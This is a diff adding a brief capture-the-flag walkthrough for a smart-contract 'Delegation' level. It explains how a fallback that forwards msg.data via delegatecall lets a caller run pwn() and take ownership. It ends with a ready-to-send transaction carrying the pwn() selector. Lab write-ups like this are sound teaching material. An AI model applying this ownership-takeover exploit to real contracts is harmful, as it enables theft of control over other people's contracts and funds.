@@ -1,0 +1,6 @@
+1) Notice that the Delegation Contract's fallback method calls the pwn() method on the delegate contract using what is sent with msg.data
+   The pwn() function changes the owner of the contract, but since the storage slots line up and the method is called using delegatecall, the owner
+   of the delegation contract will be changed
+2) Calculate the function method id for pwn using the DoMath Contract or any other method. - bytes4(sha3("functionName(inputType)")
+3) Then call the fallback method on delegation with the method id for the data - 
+await sendTransaction({from:"0xD26D6EA83bd7F54006e80d5f2134d20eC5aF85c4", to:"0xd15616d338F8e9766bF2B70F71fAC3376Fec94B2", data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"})
